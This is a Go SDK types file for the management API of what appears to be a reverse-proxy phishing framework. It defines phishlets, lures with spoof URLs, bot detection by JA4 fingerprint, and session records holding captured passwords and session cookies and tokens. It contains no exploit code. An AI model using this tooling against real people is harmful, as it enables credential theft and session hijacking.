// Package sdk provides types and a client for the mirage management API.
package sdk

import (
	"fmt"
	"slices"
	"time"
)

// EventType identifies a domain event.
type EventType string

const (
	EventSessionCreated   EventType = "session.created"
	EventCredsCaptured    EventType = "session.creds_captured"
	EventTokensCaptured   EventType = "session.tokens_captured"
	EventSessionCompleted EventType = "session.completed"
	EventBotDetected      EventType = "botguard.detected"
	EventPhishletPushed   EventType = "phishlet.pushed"
	EventPhishletEnabled  EventType = "phishlet.enabled"
	EventDNSRecordSynced  EventType = "dns.synced"
)

// AllEventTypes returns the full set of known event types. Add new event
// types here — Valid() and the notification dispatcher derive from this list.
func AllEventTypes() []EventType {
	return []EventType{
		EventSessionCreated,
		EventCredsCaptured,
		EventTokensCaptured,
		EventSessionCompleted,
		EventBotDetected,
		EventPhishletPushed,
		EventPhishletEnabled,
		EventDNSRecordSynced,
	}
}

// Valid reports whether t is a known event type.
func (t EventType) Valid() bool {
	return slices.Contains(AllEventTypes(), t)
}

// ErrorResponse is returned by the API for all error responses.
type ErrorResponse struct {
	Error string `json:"error"`
}

// PaginatedResponse wraps all list endpoint responses.
type PaginatedResponse[T any] struct {
	Items  []T `json:"items"`
	Total  int `json:"total"`
	Limit  int `json:"limit"`
	Offset int `json:"offset"`
}

// --- Sessions ---

type SessionResponse struct {
	ID           string                       `json:"id"`
	Phishlet     string                       `json:"phishlet"`
	LureID       string                       `json:"lure_id,omitempty"`
	RemoteAddr   string                       `json:"remote_addr,omitempty"`
	UserAgent    string                       `json:"user_agent,omitempty"`
	JA4Hash      string                       `json:"ja4_hash,omitempty"`
	BotScore     float64                      `json:"bot_score,omitempty"`
	Username     string                       `json:"username,omitempty"`
	Password     string                       `json:"password,omitempty"`
	Custom       map[string]string            `json:"custom,omitempty"`
	LureParams   map[string]string            `json:"lure_params,omitempty"`
	CookieTokens map[string]map[string]string `json:"cookie_tokens,omitempty"`
	BodyTokens   map[string]string            `json:"body_tokens,omitempty"`
	HTTPTokens   map[string]string            `json:"http_tokens,omitempty"`
	StartedAt    time.Time                    `json:"started_at"`
	CompletedAt  *time.Time                   `json:"completed_at,omitempty"`
}

// SessionEvent is delivered by StreamSessions for each lifecycle event.
type SessionEvent struct {
	Type    EventType
	Session SessionResponse
}

// SessionFilter scopes a ListSessions request.
type SessionFilter struct {
	Phishlet  string
	Completed *bool
	Since     *time.Time
	Until     *time.Time
	Limit     int
	Offset    int
}

// --- Lures ---

type CreateLureRequest struct {
	Phishlet    string `json:"phishlet"`
	Path        string `json:"path,omitempty"`
	RedirectURL string `json:"redirect_url,omitempty"`
	SpoofURL    string `json:"spoof_url,omitempty"`
	UAFilter    string `json:"ua_filter,omitempty"`
}

type UpdateLureRequest struct {
	RedirectURL *string `json:"redirect_url,omitempty"`
	SpoofURL    *string `json:"spoof_url,omitempty"`
	UAFilter    *string `json:"ua_filter,omitempty"`
}

type LureResponse struct {
	ID          string     `json:"id"`
	Phishlet    string     `json:"phishlet"`
	URL         string     `json:"url"`
	RedirectURL string     `json:"redirect_url"`
	SpoofURL    string     `json:"spoof_url"`
	UAFilter    string     `json:"ua_filter"`
	PausedUntil *time.Time `json:"paused_until,omitempty"`
}

type GenerateURLRequest struct {
	Params map[string]string `json:"params"`
}

type GenerateURLResponse struct {
	URL string `json:"url"`
}

type PauseLureRequest struct {
	Duration string `json:"duration"` // Go duration string, e.g. "15m", "2h"
}

// --- Phishlets ---

type PhishletResponse struct {
	Name        string `json:"name"`
	BaseDomain  string `json:"base_domain"`
	Hostname    string `json:"hostname"`
	DNSProvider string `json:"dns_provider"`
	SpoofURL    string `json:"spoof_url"`
	Enabled     bool   `json:"enabled"`
}

type PushPhishletRequest struct {
	YAML string `json:"yaml"`
}

func (r PushPhishletRequest) Validate() error {
	if r.YAML == "" {
		return fmt.Errorf("yaml: required")
	}
	return nil
}

type EnablePhishletRequest struct {
	Hostname    string `json:"hostname"`
	DNSProvider string `json:"dns_provider"`
}

// --- DNS ---

type DNSZoneResponse struct {
	Zone     string `json:"zone"`
	Provider string `json:"provider"`
	IP       string `json:"ip"`
}

// --- Blacklist ---

type BlacklistEntryResponse struct {
	Value string `json:"value"` // IP or CIDR
}

type AddBlacklistEntryRequest struct {
	Value string `json:"value"`
}

// --- BotGuard ---

type BotSignatureResponse struct {
	JA4Hash     string    `json:"ja4_hash"`
	Description string    `json:"description"`
	AddedAt     time.Time `json:"added_at"`
}

type AddBotSignatureRequest struct {
	JA4Hash     string `json:"ja4_hash"`
	Description string `json:"description,omitempty"`
}

type UpdateBotThresholdRequest struct {
	Threshold float64 `json:"threshold"` // 0.0–1.0
}

// --- Notifications ---

// ChannelType identifies the delivery backend for a notification channel.
type ChannelType string

const (
	ChannelWebhook ChannelType = "webhook"
	ChannelSlack   ChannelType = "slack"
)

type CreateNotificationChannelRequest struct {
	Type       ChannelType `json:"type"`
	URL        string      `json:"url"`
	AuthHeader string      `json:"auth_header,omitempty"` // webhook only
	Filter     []string    `json:"filter,omitempty"`      // event type filter; empty = all events
}

func (r CreateNotificationChannelRequest) Validate() error {
	switch r.Type {
	case ChannelWebhook, ChannelSlack:
	default:
		return fmt.Errorf("type: must be %q or %q", ChannelWebhook, ChannelSlack)
	}
	if r.URL == "" {
		return fmt.Errorf("url: required")
	}
	return nil
}

type NotificationChannelResponse struct {
	ID        string      `json:"id"`
	Type      ChannelType `json:"type"`
	URL       string      `json:"url"`
	Filter    []string    `json:"filter"`
	Enabled   bool        `json:"enabled"`
	CreatedAt time.Time   `json:"created_at"`
}

type NotificationChannelList struct {
	Channels []NotificationChannelResponse `json:"channels"`
}

// --- Operators ---

type InviteOperatorRequest struct {
	Name string `json:"name"`
}

func (r InviteOperatorRequest) Validate() error {
	if r.Name == "" {
		return fmt.Errorf("name: required")
	}
	return nil
}

type InviteOperatorResponse struct {
	Token string `json:"token"`
}

type EnrollRequest struct {
	Token  string `json:"token"`
	CSRPEM string `json:"csr_pem"`
}

func (r EnrollRequest) Validate() error {
	if r.Token == "" {
		return fmt.Errorf("token: required")
	}
	if r.CSRPEM == "" {
		return fmt.Errorf("csr_pem: required")
	}
	return nil
}

type EnrollResponse struct {
	CertPEM   string `json:"cert_pem"`
	CACertPEM string `json:"ca_cert_pem"`
}

type OperatorResponse struct {
	Name      string    `json:"name"`
	CreatedAt time.Time `json:"created_at"`
}

type OperatorList struct {
	Operators []OperatorResponse `json:"operators"`
}

// --- System ---

type StatusResponse struct {
	Version        string    `json:"version"`
	Uptime         string    `json:"uptime"`
	UptimeSeconds  float64   `json:"uptime_seconds"`
	GoRoutines     int       `json:"goroutines"`
	TotalSessions  int       `json:"total_sessions"`
	ActiveSessions int       `json:"active_sessions"`
	StartedAt      time.Time `json:"started_at"`
}
